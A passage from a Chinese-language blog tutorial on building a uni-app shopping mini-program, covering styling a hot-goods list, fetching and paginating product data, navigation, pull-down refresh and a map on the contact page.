class="hljs-number">10</span>rpx auto;<br><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#b50e03</span>;<br><span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br><span class="hljs-attribute">font-size</span>: <span class="hljs-number">50</span>rpx;<br>&#125;<br><br>text&#123;<br><span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-热门商品推荐"><a href="#4-热门商品推荐" class="headerlink" title="4.热门商品推荐"></a>4.热门商品推荐</h3><p>先写一个简单的title</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 热门商品 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hot_goods&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>热门商品<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后是相关样式</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">//热门商品</span><br><span class="hljs-selector-class">.hot_goods</span>&#123;<br><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#eee</span>;<br><span class="hljs-selector-class">.title</span>&#123;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">100</span>rpx;<br><span class="hljs-attribute">line-height</span>: <span class="hljs-number">100</span>rpx;<br><span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;<br><span class="hljs-attribute">text-align</span>: center;<br><span class="hljs-attribute">color</span>: <span class="hljs-variable">$uni-color-shop</span>;<br><span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">40</span>rpx;<br><span class="hljs-attribute">margin</span>: <span class="hljs-number">10</span>rpx <span class="hljs-number">0</span>rpx;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为<code>#b50e03</code>这种红色用的很多，所以我们在uni.css文件中添加一项</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/* 行为相关颜色 */</span><br><span class="hljs-variable">$uni</span>-color-shop: <span class="hljs-comment">#b50e03;</span><br></code></pre></td></tr></table></figure><p>然后我们设置color的时候就可以使用<code>$uni-color-shop</code>代替</p><p>接下来写一下热门商品列表的样式</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;view <span class="hljs-keyword">class</span>=&quot;<span class="hljs-symbol">goodList</span>&quot;&gt;<br>&lt;<span class="hljs-symbol">view</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">goodItem</span>&quot;&gt;<br>&lt;<span class="hljs-symbol">image</span> <span class="hljs-symbol">src</span>=&quot;&quot;&gt;&lt;/<span class="hljs-symbol">image</span>&gt;<br>&lt;<span class="hljs-symbol">view</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">price</span>&quot;&gt;<br>&lt;<span class="hljs-symbol">text</span>&gt;￥<span class="hljs-symbol">123</span>&lt;/<span class="hljs-symbol">text</span>&gt;<br>&lt;<span class="hljs-symbol">text</span>&gt;￥<span class="hljs-symbol">234</span>&lt;/<span class="hljs-symbol">text</span>&gt;<br>&lt;/<span class="hljs-symbol">view</span>&gt;<br>&lt;<span class="hljs-symbol">view</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">name</span>&quot;&gt;<br><span class="hljs-symbol">swpu</span><br>&lt;/<span class="hljs-symbol">view</span>&gt;<br>&lt;/<span class="hljs-symbol">view</span>&gt;<br><br>&lt;<span class="hljs-symbol">view</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">goodItem</span>&quot;&gt;<br>&lt;<span class="hljs-symbol">image</span> <span class="hljs-symbol">src</span>=&quot;&quot;&gt;&lt;/<span class="hljs-symbol">image</span>&gt;<br>&lt;<span class="hljs-symbol">view</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">price</span>&quot;&gt;<br>&lt;<span class="hljs-symbol">text</span>&gt;￥<span class="hljs-symbol">123</span>&lt;/<span class="hljs-symbol">text</span>&gt;<br>&lt;<span class="hljs-symbol">text</span>&gt;￥<span class="hljs-symbol">234</span>&lt;/<span class="hljs-symbol">text</span>&gt;<br>&lt;/<span class="hljs-symbol">view</span>&gt;<br>&lt;<span class="hljs-symbol">view</span> <span class="hljs-symbol">class</span>=&quot;<span class="hljs-symbol">name</span>&quot;&gt;<br><span class="hljs-symbol">swpu</span><br>&lt;/<span class="hljs-symbol">view</span>&gt;<br>&lt;/<span class="hljs-symbol">view</span>&gt;<br>&lt;/<span class="hljs-symbol">view</span>&gt;<br></code></pre></td></tr></table></figure><p>样式：其中有很多样式设置很巧妙</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-class">.goodList</span>&#123;<br><span class="hljs-comment">//开启flex</span><br><span class="hljs-attribute">display</span>: flex;<br><span class="hljs-comment">//换行</span><br><span class="hljs-attribute">flex-wrap</span>: wrap;<br><span class="hljs-comment">//贴边对齐</span><br><span class="hljs-attribute">justify-content</span>: space-between;<br><span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">15</span>rpx;<br><span class="hljs-selector-class">.goodItem</span>&#123;<br><span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">355</span>rpx;<br><span class="hljs-attribute">margin</span>: <span class="hljs-number">20</span>rpx <span class="hljs-number">0</span>;<br><span class="hljs-attribute">padding</span>: <span class="hljs-number">15</span>rpx;<br><span class="hljs-attribute">box-sizing</span>: border-box;<br>image&#123;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">80%</span>;<br><span class="hljs-attribute">height</span>:<span class="hljs-number">300</span>rpx;<br><span class="hljs-attribute">display</span>: block;<br><span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>&#125;<br><br><span class="hljs-selector-class">.price</span>&#123;<br><span class="hljs-attribute">color</span>: <span class="hljs-variable">$uni-color-shop</span>;<br><span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;<br>text<span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>)&#123;<span class="hljs-comment">//单独设置第二个text样式</span><br><span class="hljs-attribute">color</span>: <span class="hljs-number">#ccc</span>;<br><span class="hljs-attribute">font-size</span>: <span class="hljs-number">28</span>rpx;<br><span class="hljs-attribute">margin-left</span>: <span class="hljs-number">17</span>rpx;<br><span class="hljs-attribute">text-decoration</span>: line-through;<br>&#125;<br>&#125;<br><br><span class="hljs-selector-class">.name</span>&#123;<br><span class="hljs-attribute">font-size</span>: <span class="hljs-number">28</span>rpx;<br><span class="hljs-attribute">line-height</span>: <span class="hljs-number">50</span>rpx;<br><span class="hljs-attribute">padding-top</span>: <span class="hljs-number">10</span>rpx;<br><span class="hljs-attribute">padding-bottom</span>: <span class="hljs-number">15</span>rpx;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-热门商品数据渲染"><a href="#5-热门商品数据渲染" class="headerlink" title="5.热门商品数据渲染"></a>5.热门商品数据渲染</h3><p>简单的发一个请求然后v-for遍历</p><p>data中写一个hotGoods数组准备存放我们的数据</p><p>然后发送请求接收数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 获取热门商品列表</span><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">getHotGoods</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.$myreq(&#123;<br><span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/api/getgoods?pageindex=1&quot;</span>,<br>&#125;)<br><span class="hljs-built_in">this</span>.hotGoods = res.data.message<br>&#125;<br></code></pre></td></tr></table></figure><p>得到数据然后遍历goodItem</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;goodItem&quot;</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;item in hotGoods&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://img13.360buyimg.com/n7/jfs/t1/131119/27/26844/20436/631938aaEcb21d77f/c6b07559e6a6db21.jpg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;price&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span>￥</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">item.sell_price</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span>￥</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">item.market_price</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">item.title</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="6-热门数据组件化"><a href="#6-热门数据组件化" class="headerlink" title="6.热门数据组件化"></a>6.热门数据组件化</h3><p>新建一个components目录，下面加入goodList组件，将index中商品列表的部分移植过来</p><h3 id="7-实现导航栏跳转"><a href="#7-实现导航栏跳转" class="headerlink" title="7.实现导航栏跳转"></a>7.实现导航栏跳转</h3><p>对于导航栏，我们首先需要做一个更新，变成需要使用v-for循环得到</p><p>在data中建立一个navs数组存放数据：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs less">navs: [<br>&#123;<br><span class="hljs-attribute">icon</span>: <span class="hljs-string">&#x27;iconfont icon-ziyuan&#x27;</span>,<br><span class="hljs-attribute">title</span>: <span class="hljs-string">&#x27;超市&#x27;</span>,<br><span class="hljs-attribute">url</span>: <span class="hljs-string">&#x27;/pages/goods/goods&#x27;</span><br>&#125;,<br>&#123;<br><span class="hljs-attribute">icon</span>: <span class="hljs-string">&#x27;iconfont icon-guanyuwomen&#x27;</span>,<br><span class="hljs-attribute">title</span>: <span class="hljs-string">&#x27;联系我们&#x27;</span>,<br><span class="hljs-attribute">url</span>: <span class="hljs-string">&#x27;/pages/contact/contact&#x27;</span><br>&#125;,<br>&#123;<br><span class="hljs-attribute">icon</span>: <span class="hljs-string">&#x27;iconfont icon-tupian&#x27;</span>,<br><span class="hljs-attribute">title</span>: <span class="hljs-string">&#x27;社区图片&#x27;</span>,<br><span class="hljs-attribute">url</span>: <span class="hljs-string">&#x27;/pages/pics/pics&#x27;</span><br>&#125;,<br>&#123;<br><span class="hljs-attribute">icon</span>: <span class="hljs-string">&#x27;iconfont icon-shipin&#x27;</span>,<br><span class="hljs-attribute">title</span>: <span class="hljs-string">&#x27;学习视频&#x27;</span>,<br><span class="hljs-attribute">url</span>: <span class="hljs-string">&#x27;/pages/videos/videos&#x27;</span><br>&#125;,<br>]<br></code></pre></td></tr></table></figure><p>然后更改导航栏的结构，使用v-for得到数据</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav_item&quot;</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(item,index) in navs&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;item.icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">item.title</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>执行跳转需要一个点击事件</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-comment">&lt;!-- 导航栏 --&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav_item&quot;</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(item,index) in navs&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;navItemClick(item.url)&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;item.icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">item.title</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>拿到每一个item的url之后可以调用navigateTo进行跳转</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//点击导航栏触发跳转</span><br><span class="hljs-function"><span class="hljs-title">navItemClick</span><span class="hljs-params">(url)</span></span>&#123;<br>uni<span class="hljs-selector-class">.navigateTo</span>(&#123;<br>url<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们对跳转的页面进行处理：新建一个goods页面作为跳转目的地，引用goodList组件，这里主要是pageindex中的数字不能写死，需要根据用户的需求进行调整</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;good_List&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">goodList</span> <span class="hljs-attr">:goods</span>=<span class="hljs-string">&quot;goods&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goodList</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript"><span class="hljs-keyword">import</span> goodList <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../../components/goodList/goodList.vue&#x27;</span></span><br><span class="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="javascript"><span class="hljs-attr">components</span>: &#123;<span class="hljs-string">&quot;goodList&quot;</span>:goodList&#125;,</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="javascript"><span class="hljs-attr">pageindex</span> : <span class="hljs-number">1</span>,</span><br><span class="javascript"><span class="hljs-attr">goods</span> : []</span><br><span class="javascript">&#125;</span><br><span class="javascript">&#125;,</span><br><span class="javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="javascript"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">getGoods</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">const</span> res =  <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.$myreq(&#123;</span><br><span class="javascript"><span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/api/getGoods?pageindex=&#x27;</span>+<span class="hljs-built_in">this</span>.pageindex</span><br><span class="javascript">&#125;)</span><br><span class="javascript"></span><br><span class="javascript"><span class="hljs-built_in">this</span>.goods = res.data.message</span><br><span class="javascript">&#125;</span><br><span class="javascript">&#125;,</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-title">onLoad</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript"><span class="hljs-built_in">this</span>.getGoods()</span><br><span class="javascript">&#125;</span><br><span class="javascript">&#125;</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;scss&quot;</span>&gt;</span><span class="css"></span><br><span class="css"><span class="hljs-selector-class">.goodList</span>&#123;</span><br><span class="css"><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#eee</span>;</span><br><span class="css">&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当用户滑到底部的时候，调用一个函数获取新的页面，改造一下我们的getGoods函数</p><p>我一开始用的push</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//实现数组的叠加</span><br>this<span class="hljs-selector-class">.goods</span><span class="hljs-selector-class">.push</span>(..<span class="hljs-selector-class">.res</span><span class="hljs-selector-class">.data</span>.message)<br></code></pre></td></tr></table></figure><p>后面发现直接使用展开运算符是一样的效果</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">async getGoods()&#123;<br><span class="hljs-keyword">const</span> res =  await <span class="hljs-keyword">this</span>.$myreq(&#123;<br>url:<span class="hljs-string">&#x27;/api/getGoods?pageindex=&#x27;</span>+<span class="hljs-keyword">this</span>.pageindex<br>&#125;)<br><span class="hljs-comment">//实现数组的叠加</span><br><span class="hljs-keyword">this</span>.goods = [...<span class="hljs-keyword">this</span>.goods, ...res.<span class="hljs-keyword">data</span>.message]<br>&#125;<br></code></pre></td></tr></table></figure><p>但是我们这里会显示其他页的数据，通过改变我们的pageindex，然后触底的时候发送请求</p><p>我们首先写一个，没有更多数据的提示</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;isOver&quot; v-<span class="hljs-keyword">show</span>=&quot;flag&quot;&gt;<span class="hljs-comment">-----我也是有底线的-----&lt;/view&gt;</span><br></code></pre></td></tr></table></figure><p>这个提示的显示由<strong>请求到的数据是不是为空</strong>决定，没有数据了我们达到底部也不发送请求</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">onReachBottom() &#123;<br><span class="hljs-keyword">this</span>.pageindex++<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.flag == <span class="hljs-literal">false</span>)&#123;<br><span class="hljs-keyword">this</span>.getGoods()<br>&#125;<br>&#125;,<br></code></pre></td></tr></table></figure><p>然后在getGoods中判断，没有数据了就将flag为true，将提示显示出来</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">async getGoods()&#123;<br><span class="hljs-keyword">const</span> res =  await <span class="hljs-keyword">this</span>.$myreq(&#123;<br>url:<span class="hljs-string">&#x27;/api/getGoods?pageindex=&#x27;</span>+<span class="hljs-keyword">this</span>.pageindex<br>&#125;)<br><span class="hljs-comment">//判断是否还有数据</span><br><span class="hljs-keyword">if</span>(res.<span class="hljs-keyword">data</span>.message.length == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">this</span>.flag = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-comment">//实现数组的叠加</span><br><span class="hljs-comment">// this.goods.push(...res.data.message)</span><br><span class="hljs-keyword">this</span>.goods = [...<span class="hljs-keyword">this</span>.goods, ...res.<span class="hljs-keyword">data</span>.message]<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们设置一个下拉刷新，在pages.json中打开我们的PullDownRefresh</p><p>在下拉的生命周期中重置数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//下拉刷新</span><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">onPullDownRefresh</span>(<span class="hljs-params"></span>)</span> &#123;<br><span class="hljs-built_in">this</span>.pageindex == <span class="hljs-number">1</span><br><span class="hljs-built_in">this</span>.goods = []<br><span class="hljs-built_in">this</span>.flag = <span class="hljs-literal">false</span><br><span class="hljs-comment">//等待请求发送成功后消除刷新效果</span><br><span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.getGoods()<br>uni.stopPullDownRefresh()<br>&#125;<br></code></pre></td></tr></table></figure><p>如果getGoods执行完毕就触发stopPullDownRefresh，还有一种方法是将stopPullDownRefresh设置成getGoods的回调</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">this.get<span class="hljs-constructor">Goods(()</span>=&gt;&#123;<br>uni.stop<span class="hljs-constructor">PullDownRefresh()</span><br>&#125;)<br><br>callBack<span class="hljs-operator"> &amp;&amp; </span>call<span class="hljs-constructor">Back()</span><br><br><span class="hljs-comment">//getGoods中接收回调</span><br>get<span class="hljs-constructor">Goods(<span class="hljs-params">callBack</span>)</span><br></code></pre></td></tr></table></figure><h3 id="8-contact页面的map"><a href="#8-contact页面的map" class="headerlink" title="8. contact页面的map"></a>8. contact页面的map</h3><p>这里启用在manifest.json中的h5配置中的定位和地图，需要输入一个应用key，在腾讯地图中申请便可</p><p>将key设置成map</p><p>就可以在我们的程序中使用<code>&lt;map&gt;</code>标签使用</p><p>map中有两个位置属性 分别代表经纬度，一般将经纬度数据放在data中如何动态绑定</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&lt;map class=<span class="hljs-string">&quot;map&quot;</span> <span class="hljs-symbol">:latitude=<span class="hljs-string">&quot;latitude&quot;</span></span> <span class="hljs-symbol">:longitude=<span class="hljs-string">&quot;longitude&quot;</span>&gt;&lt;/map&gt;</span><br></code></pre></td></tr></table></figure><p>还可以设置坐标点等，写的时候本来想把iconpath写成绝对路径的，但是一直报错，改成相对路径才正确</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 